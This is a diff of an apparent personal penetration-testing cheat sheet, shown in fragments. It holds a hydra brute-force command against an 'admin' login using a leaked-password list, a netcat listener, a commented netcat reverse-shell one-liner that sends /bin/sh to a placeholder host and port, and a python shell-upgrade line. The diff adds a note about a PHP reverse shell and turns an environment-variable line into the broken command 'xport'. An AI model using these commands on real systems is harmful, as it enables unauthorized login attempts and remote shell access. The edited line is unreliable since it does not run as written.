@@ -118,6 +118,10 @@ hydra -l admin -P /usr/share/seclists/Passwords/darkweb2017-top10000.txt \
 nc -nvlp 5555
 
 # Common one-liners: - check revshells.com for making the best ones!
+
+
+#php - the one from Ivan Sincek works for sure (sometimes at least!)
+
 # nc (if -e supported)
 # nc -e /bin/sh <LHOST> <LPORT>
 
@@ -134,7 +138,7 @@ nc -nvlp 5555
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 #also what else?
-export TERN=xterm
+xport TERM=xterm-256color
 
 #and something more i am sure?
 
